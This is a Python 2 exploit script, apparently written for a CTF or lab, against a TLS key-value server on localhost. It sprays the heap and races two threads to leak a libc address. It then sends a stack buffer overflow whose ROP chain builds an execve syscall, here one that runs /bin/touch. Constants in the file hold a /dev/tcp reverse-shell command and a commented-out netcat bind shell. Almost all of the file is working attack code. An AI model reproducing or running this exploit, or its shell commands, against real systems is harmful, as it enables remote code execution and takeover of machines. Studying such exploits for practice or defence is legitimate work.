#!/usr/bin/python
import socket
import struct
import ssl
import time
import telnetlib
import threading
import re
import sys
from struct import pack
from collections import Counter


v = ('127.0.0.1', 20006)


CMD = '/bin/sh > /dev/tcp/127.0.0.1/1337 0>&1 2>&1 ;'
CMD = 'touch /tmp/hackingworking'
#CMD = '/bin/nc.traditional -ltp 1337 -e//bin///sh   '


# connection 
def connect(v):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect(v)
	time.sleep(0.1)
	s = ssl.wrap_socket(s,ssl_version=ssl.PROTOCOL_TLSv1)
	#time.sleep(0.1)
	print s.recv(1024)
	return s



def writethroughpayload(libc, base, data):
	data = re.findall('....', data)
	gt =  libc + 0x000e0097 # pop %ecx | pop %ebx | ret
	gt2 = libc + 0x000238df # pop %eax | ret
	gt3 = libc + 0x0006cc5a # mov %eax,(%ecx) | ret
	p = ''
	for n, i in enumerate(data):
		print '[+] Number {} Data {}'.format(n*4, i)
		p += pack("<I", gt) # pop %ecx | pop %ebx | ret
	        p += pack("<I", base+(n*4)) # @ .data + 4
		p += pack("<I", 0x42424242) # padding
		p += pack("<I", gt2) # pop %eax | ret
		p += i
		p += pack("<I", gt3) # mov %eax,(%ecx) | ret
	p += pack("<I", libc + 0x000328e0) # xor %eax,%eax | ret
	p += pack("<I", libc + 0x0014a0df) # inc %ecx | ret
	p += pack("<I", libc + 0x0014a0df) # inc %ecx | ret
	p += pack("<I", libc + 0x0014a0df) # inc %ecx | ret
	p += pack("<I", libc + 0x0014a0df) # inc %ecx | ret
	p += pack("<I", libc + 0x0006cc5a) # mov %eax,(%ecx) | ret
	return p


# Open bind shell : port 1337
def openncshell(libcbase):
	data = 0x176000 + 0x2000 +0x1000+20
	data2 = data + 0x50

	# Because Of Some Error. Here, I am print every single payload bytes
	p = writethroughpayload(libcbase, libcbase+data, '/tmp/hackingworks ') # command
	p += writethroughpayload(libcbase, libcbase+data2, '/bin/touch   ') # name 

	# EBX = filename
	p += pack('<I', libcbase +0x00018f4e) # pop ebx ; ret
	p += pack('<I', libcbase +data2) #--> Filename
	
	# ECX = Argv EDX = NULL
	p += pack('<I', libcbase +0x2da2b) # pop ecx ; pop edx ; ret
	p += pack('<I', libcbase +data)  # argv
	p += pack('<I', libcbase +data+20) # NULL

	# EAX = 11 + kernel call done
	p += pack('<I', libcbase +0x0002eb8f) # xor eax, eax ; ret
	p += pack('<I', libcbase +0x00026722) # inc eax ; ret
	p += pack('<I', libcbase +0x00026722) # inc eax ; ret
	p += pack('<I', libcbase +0x00026722) # inc eax ; ret
	p += pack('<I', libcbase +0x00026722) # inc eax ; ret
	p += pack('<I', libcbase +0x00026722) # inc eax ; ret
	p += pack('<I', libcbase +0x00026722) # inc eax ; ret
	p += pack('<I', libcbase +0x00026722) # inc eax ; ret
	p += pack('<I', libcbase +0x00026722) # inc eax ; ret
	p += pack('<I', libcbase +0x00026722) # inc eax ; ret
	p += pack('<I', libcbase +0x00026722) # inc eax ; ret
	p += pack('<I', libcbase +0x00026722) # inc eax ; ret
	#p += '\xcc'*4
	p += pack('<I', libcbase +0x0002dd35) # int 0x80
	print '[+] Want To Check Syscall. Set breakpoint here : ', hex(libcbase +0x0002dd35)

	return p


def exploit(libc):
	# Payload
	# EIP = 60
	# EDI = 52
	# ESI = 48
	# EBP = 56
	# EBX  = 44
	payload = 'N'*28  # Paddings
	payload += pack('I', libc+0x17600+0x3000+0x150)
	payload += 'N'*12
	payload += 'JJJJ' # EBX
	payload += 'KKKK' # ESI
	payload += 'LLLL' # EDI
	payload += 'MMMM' # EBP
	payload += pack("I", libc + 0x000e0097) # EIP = pop %ecx | pop %ebx | ret)
	#payload += openncshell(libc) # EIP
	# Got Control Over 
	# EAX = EAX - 
	# EDX = 64 Offset 
	# ESI = 64 Offset
	#  mov    eax,DWORD PTR [esi+0x55c]
	payload += struct.pack('I', libc-0x55c) #struct.pack('I', (libc + 0x0003cb20)-0x55c) # 64 System
	payload += 'BBBB'
	payload += openncshell(libc)
	

	return payload

# heavy spray
def heavyspray(v):
	v = connect(v)
	for i in range(600):
		v.send("s {} {}\n".format(i, 500))
		v.send("{}\n".format('A'*500))

		time.sleep(0.005)
		v.recv(1024)
	v.close()
	return


# 
def extractaddr(data):
	data = data[::-1]
	b7 = re.findall('\xb7...', data)
	b8 = re.findall('\xb8...', data)

	if len(b8)<len(b7):
		b = [struct.unpack(">I", i)[0] for i in b7]
	else:
		b = [struct.unpack(">I", i)[0] for i in b8]
	b = [int(((i >> 12)<< 12)) for i in b]
	b.sort()
	#print 'Complete : ', b
	data = Counter(b)
	print "[-] Most Occured Address : ", data.most_common(1)[0][0]
	libc = int(data.most_common(1)[0][0]-0x179000)
	print "[-] May be Our Libc Address is : ", hex(libc)
	return libc



# MainEngine For Updating Data Regularly
class MainEngine(threading.Thread):
	def __init__(self, v):
		threading.Thread.__init__(self)
		self.s = connect(v)
		self.runcycle = True

	def run(self):
		print "[*] Main Engine Started."
	        buf1 = "B"*150
        	buf2 = "A"*150
        	size = len(buf1)
        	key = "test"
		while self.runcycle:
		                self.s.send("s {} {}\n".format(key, size))
                		self.s.send("{}\n".format(buf1))
		self.s.send('exit\n')
		self.s.close()	
		print "[*] Main Engine Close."
		return

# Back Engine For Reading Data Regularly
class BackEngine(threading.Thread):
	def __init__(self, v, engine):
		threading.Thread.__init__(self)
		self.engine = engine
		self.info = v
		self.v = connect(v)
		
	def run(self):
		print "[*] Back Engine Start"
		while True:
			self.v.send('g test\n')
			try:
                		chk = self.v.recv(1024)
			except:
				chk = ''                	
                	if chk:
                        	if ('\xb6' in chk) or ('\xb7' in chk) or ('\xb8' in chk) or ('\xb9' in chk):
                                	self.engine.runcycle = False
					self.v.close()
					print "[*] Back Engine Close"
					libc = extractaddr(chk)
					bof = exploit(libc)
					raw_input('[-] Ready To Sent Exploit. Press Enter')
					v = connect(self.info)
					v.send("s exploit -2\n")
					time.sleep(0.5)
					v.send(bof)
					raw_input("[+] Payload Sent. Check Netcat.")
					self.v.close()
					return
		return


def main(v):
	raw_input('Data Leak Start')
	thread = MainEngine(v)
	#time.sleep(1)
	thread1 = BackEngine(v, thread)
	time.sleep(0.1)
	thread.start()
	time.sleep(0.1)
	thread1.start()
	print '[+] Waiting For Response.'
	thread1.join()
	print '[-] Extracting Data From Response.'
	return

if 'leak' in sys.argv:
	main(v)

elif 'spray' in sys.argv:
	raw_input('Heavy Spray Start')
        heavyspray(v)
	print "[*] Spray Complete."
else:
	print "[*] Please Provide Usages Arguments : \n [1]. spray\n [2]. leak\n"

exit(0)

